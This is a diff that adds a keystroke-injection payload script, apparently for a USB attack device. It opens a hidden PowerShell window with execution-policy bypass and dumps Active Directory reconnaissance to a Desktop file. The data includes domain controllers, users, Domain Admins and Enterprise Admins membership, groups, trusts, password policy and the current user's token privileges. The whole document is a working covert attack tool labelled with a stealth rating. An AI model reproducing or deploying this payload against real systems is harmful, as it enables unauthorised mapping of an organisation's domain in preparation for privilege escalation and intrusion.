@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Active Directory Enumeration
+REM  FLLC - by PERSON FU
+REM  Time: ~20 seconds | Stealth: MEDIUM
+REM  Dumps AD structure, users, groups, GPOs
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\ad_enum_'+$env:COMPUTERNAME+'.txt';$r=@();$r+='=== AD ENUMERATION ===';$r+='Time: '+(Get-Date);$r+='Host: '+$env:COMPUTERNAME;$r+='Domain: '+$env:USERDNSDOMAIN;$r+='';try{$r+='=== DOMAIN CONTROLLERS ===';nltest /dclist:$env:USERDNSDOMAIN 2>$null|%{$r+=$_};$r+='';$r+='=== DOMAIN USERS ===';net user /domain 2>$null|%{$r+=$_};$r+='';$r+='=== DOMAIN ADMINS ===';net group 'Domain Admins' /domain 2>$null|%{$r+=$_};$r+='';$r+='=== ENTERPRISE ADMINS ===';net group 'Enterprise Admins' /domain 2>$null|%{$r+=$_};$r+='';$r+='=== DOMAIN GROUPS ===';net group /domain 2>$null|%{$r+=$_};$r+='';$r+='=== GROUP POLICY ===';gpresult /r 2>$null|%{$r+=$_};$r+='';$r+='=== TRUST RELATIONSHIPS ===';nltest /domain_trusts 2>$null|%{$r+=$_};$r+='';$r+='=== PASSWORD POLICY ===';net accounts /domain 2>$null|%{$r+=$_};$r+='';$r+='=== CURRENT USER TOKENS ===';whoami /all 2>$null|%{$r+=$_}}catch{$r+='Not domain joined or access denied'};$r|Out-File $o -Encoding UTF8"
+ENTER
+DELAY 500
